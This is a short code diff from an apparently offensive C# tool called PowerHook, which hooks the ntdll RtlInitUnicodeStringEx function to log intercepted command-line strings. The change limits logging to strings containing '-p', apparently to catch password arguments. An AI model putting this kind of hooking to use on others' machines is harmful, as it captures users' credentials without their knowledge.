@@ -438,7 +438,7 @@ namespace PowerHook
         //CMD
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
         delegate bool RtlInitUnicodeStringEx_Delegate(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] String SourceString);
-        [DllImport("ntdll.dll",EntryPoint = "RtlInitUnicodeStringEx", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+        [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
         static extern bool RtlInitUnicodeStringEx(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] String SourceString);
 
 
@@ -454,10 +454,13 @@ namespace PowerHook
                     {
                         string date = DateTime.Now.ToString();
                         String Data =  SourceString;
+                        if (Data.Contains("-p"))
+                        {
+                            this._messageQueue.Enqueue(
+                            string.Format("[+] [{0}] Found cmd data --> {1}", date, Data));
 
-                        this._messageQueue.Enqueue(
-                        string.Format("[+] [{0}] Found cmd data --> {1}", date, Data));
-                        
+                        }
+
 
                     }
                 }
